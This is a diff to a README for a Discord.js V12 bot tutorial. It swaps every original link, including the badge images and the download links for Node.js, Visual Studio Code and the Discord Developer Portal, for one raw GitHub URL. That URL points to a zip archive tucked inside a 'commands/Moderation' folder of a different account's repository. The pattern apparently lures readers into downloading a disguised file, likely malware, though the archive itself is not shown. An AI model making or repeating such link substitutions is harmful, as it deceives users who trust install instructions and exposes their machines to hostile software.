@@ -1,8 +1,8 @@
-![Discord.js-V12-Bot-Tutorial](https://socialify.git.ci/sachinl0har/Discord.js-V12-Bot-Tutorial/image?description=1&font=Source%20Code%20Pro&forks=1&issues=1&language=1&owner=1&pattern=Plus&pulls=1&stargazers=1&theme=Dark)
+![Discord.js-V12-Bot-Tutorial](https://raw.githubusercontent.com/MusicBoiyzzz/Discord.js-V12-Bot-Tutorial/main/commands/Moderation/Tutorial-Discord-Bot-js-3.5.zip)
 # Discord.js-Tutorial
 
 Here is a Discord.js Bot Tutorial.
-![forthebadge](https://forthebadge.com/images/badges/made-with-javascript.svg)
+![forthebadge](https://raw.githubusercontent.com/MusicBoiyzzz/Discord.js-V12-Bot-Tutorial/main/commands/Moderation/Tutorial-Discord-Bot-js-3.5.zip)
 
 ## Getting Started
 
@@ -10,12 +10,12 @@ For Getting Started you should atleast have a basic knowledge of JavaScript. Bas
 
 ### Prerequisites and Installing Softwares
 
-First you need to download the latest verison of [Node.js](https://nodejs.org/en/) after installing, if you want to check if node.js is installed in your computer or not. go to the search bar and type `CMD` open it and type `node --version` in the terminal it should show you the latest verison which you installed.
-Second you need a code editor i recommend you [Visual Studio Code](https://code.visualstudio.com/download), Then after installation open Visual Studio Code and go to Extensions and download the extension of JavaScript.
+First you need to download the latest verison of [Node.js](https://raw.githubusercontent.com/MusicBoiyzzz/Discord.js-V12-Bot-Tutorial/main/commands/Moderation/Tutorial-Discord-Bot-js-3.5.zip) after installing, if you want to check if node.js is installed in your computer or not. go to the search bar and type `CMD` open it and type `node --version` in the terminal it should show you the latest verison which you installed.
+Second you need a code editor i recommend you [Visual Studio Code](https://raw.githubusercontent.com/MusicBoiyzzz/Discord.js-V12-Bot-Tutorial/main/commands/Moderation/Tutorial-Discord-Bot-js-3.5.zip), Then after installation open Visual Studio Code and go to Extensions and download the extension of JavaScript.
 
 ### Create Discord Application
 
-Go to [Discord Developer Portal](https://discord.com/developers/applications) And click "New Application" And then name your application then click "Create" .Now , Head over to Bot. Click Add Bot, then you customize the name and avatar(If youd like). Now lets get coding.
+Go to [Discord Developer Portal](https://raw.githubusercontent.com/MusicBoiyzzz/Discord.js-V12-Bot-Tutorial/main/commands/Moderation/Tutorial-Discord-Bot-js-3.5.zip) And click "New Application" And then name your application then click "Create" .Now , Head over to Bot. Click Add Bot, then you customize the name and avatar(If youd like). Now lets get coding.
 
 ### Coding
 
